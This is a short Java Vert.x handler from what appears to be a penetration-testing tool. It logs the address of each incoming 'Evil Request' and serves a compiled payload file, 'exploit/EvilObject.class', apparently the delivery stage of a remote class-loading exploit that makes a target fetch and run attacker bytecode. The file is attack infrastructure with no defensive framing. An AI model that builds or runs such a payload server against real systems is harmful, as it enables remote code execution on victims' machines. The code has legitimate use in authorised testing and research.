package de.marko.pentest.rest.handler;

import io.vertx.core.Handler;
import io.vertx.ext.web.RoutingContext;
import java.io.File;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

/**
 * @author marko
 * @version 1.0.0.
 * @date 22.08.2017
 */
public class EvilDownloadHandler implements Handler<RoutingContext> {

	private final static Logger LOGGER = LoggerFactory.getLogger(EvilDownloadHandler.class);

	private final String exploit = "exploit/EvilObject.class";

	@Override
	public void handle(RoutingContext routingContext) {

		LOGGER.info(
			"Incoming Evil Request: " + routingContext.request().connection().remoteAddress()
				.host());


		try {
			File payload = new File(exploit);

			if (!payload.isFile()) {
				throw new NullPointerException("Cannot found payload in " + exploit);
			}

			routingContext.response().sendFile(payload.getAbsolutePath());

		} catch (NullPointerException e) {
			LOGGER.error("Cannot found payload in " + exploit);
			LOGGER.debug("Cannot found payload in " + exploit, e);
			routingContext.response().setStatusCode(404).end();
		}
	}
}
